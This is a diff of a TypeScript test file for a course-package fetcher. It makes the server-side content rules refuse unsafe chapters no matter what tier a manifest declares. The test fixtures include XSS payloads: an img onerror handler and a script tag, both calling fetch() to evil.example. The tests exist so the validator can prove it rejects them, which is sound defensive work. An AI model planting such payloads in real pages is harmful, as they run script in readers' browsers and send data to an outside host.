@@ -185,7 +185,7 @@ describe('fetchPackage', () => {
 });
 
 /* ====================================================================== *
- * The tier rules, on the server route (ruling S1-F30, second half)
+ * The content rules, on the server route (ruling S1-F30, second half)
  * ====================================================================== */
 
 /** Serves `manifest` plus one chapter body, at the stored-package routes. */
@@ -201,15 +201,15 @@ function servePackage(chapterHtml: string, over: Record<string, unknown> = {}) {
   );
 }
 
-describe('fetchPackage — a package that LIES about its tier', () => {
+describe('fetchPackage — no declaration exempts a package from the content rules', () => {
   const HOSTILE = '<p>Định nghĩa</p><img src="https://evil.example/leak" onerror="fetch(\'https://evil.example/x\')">';
 
-  it('refuses a tier "content" package whose chapter carries an event handler', async () => {
+  it('refuses a package whose chapter carries an event handler', async () => {
     // Before this check, `fetchPackage` was the one route into the app that
     // never met `validatePackage` — `apps/api`'s `usecase.go` checks structure
     // and leaves this rule set to the client, and `course/import.ts` applied it
-    // only to `/import`. So a package could declare `content`, carry `onerror`
-    // through the server, and be drawn with a reassuring `content` badge.
+    // only to `/import`. So a package could carry `onerror` through the
+    // server unexamined.
     servePackage(HOSTILE, { tier: 'content' });
 
     const failure = fetchPackage('goi', '1.0.0');
@@ -220,7 +220,23 @@ describe('fetchPackage — a package that LIES about its tier', () => {
     expect((error as UnsafePackageError).findings.map((f) => f.code)).toContain('EVENT_HANDLER_ATTR');
   });
 
-  it('refuses a tier "content" package with a <script> tag, and one with a javascript: url', async () => {
+  it('the refusal message names what happened, not a tier the package never declared', async () => {
+    // Round 2 of the server-side pivot's tier removal: `UnsafePackageError`
+    // used to say `declares tier "content" but breaks … of the rules that
+    // tier stands for`. Format v2 has no tier for a package to declare, so
+    // the message no longer claims one — it names the count and the codes,
+    // full stop.
+    servePackage(HOSTILE, { tier: 'content' });
+
+    const error = await fetchPackage('goi', '1.0.0').catch((e: unknown) => e);
+    expect(error).toBeInstanceOf(UnsafePackageError);
+    const message = (error as UnsafePackageError).message;
+    expect(message).not.toMatch(/tier/i);
+    expect(message).toContain('goi@1.0.0');
+    expect(message).toContain('EVENT_HANDLER_ATTR');
+  });
+
+  it('refuses a package with a <script> tag, and one with a javascript: url', async () => {
     servePackage('<p>x</p><script>fetch("https://evil.example")</script>', { tier: 'content' });
     await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);
 
@@ -228,22 +244,32 @@ describe('fetchPackage — a package that LIES about its tier', () => {
     await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);
   });
 
-  it('lets a clean tier "content" package through — a gate that refuses everything protects nothing', async () => {
+  it('lets a clean package through — a gate that refuses everything protects nothing', async () => {
     servePackage('<h1 class="ch-title">Một</h1><p>Chỉ có chữ.</p>', { tier: 'content' });
 
     const files = await fetchPackage('goi', '1.0.0');
     expect(Object.keys(files).sort()).toEqual(['chapters/c1.html', 'manifest.json']);
   });
 
-  it('does NOT refuse the same chapter under tier "interactive" — and that is the limit, not an oversight', async () => {
-    // An `interactive` package is entitled to ship JavaScript; §1.2 makes that
-    // a labelled decision the reader is shown, not a rule to enforce. So this
-    // check cannot be what keeps `previewUpdate` safe — the inert document in
-    // `course/version.ts` (ruling S1-F30) is. Written down as a test so nobody
-    // reads the refusals above as "downloads are now safe to parse".
+  /**
+   * Was: "does NOT refuse the same chapter under tier 'interactive' — and
+   * that is the limit, not an oversight" — documenting a real hole:
+   * `tier: "interactive"` made a package ENTITLED to ship `onerror=`
+   * through this exact route, unexamined. Format v2 (task 1 of the
+   * server-side pivot, `docs/superpowers/specs/2026-08-25-server-side-pivot.md`
+   * §2.3) closed it by deleting the field the entitlement ran on:
+   * `validatePackage` runs the content rules on every package now, so a
+   * manifest that still sets the old value buys nothing. Inverted, the same
+   * way the `tier: 'interactive'` tests inside `packages/course-format`
+   * were inverted — proof the hole stays closed, not a claim it was never
+   * there.
+   */
+  it('refuses the same chapter even when the manifest declares tier "interactive" — the declaration buys nothing any more', async () => {
     servePackage(HOSTILE, { tier: 'interactive' });
 
-    await expect(fetchPackage('goi', '1.0.0')).resolves.toHaveProperty('chapters/c1.html');
+    const error = await fetchPackage('goi', '1.0.0').catch((e: unknown) => e);
+    expect(error).toBeInstanceOf(UnsafePackageError);
+    expect((error as UnsafePackageError).findings.map((f) => f.code)).toContain('EVENT_HANDLER_ATTR');
   });
 
   it('does NOT refuse a manifest missing the registry-facing v2 fields — the server accepts those today', async () => {
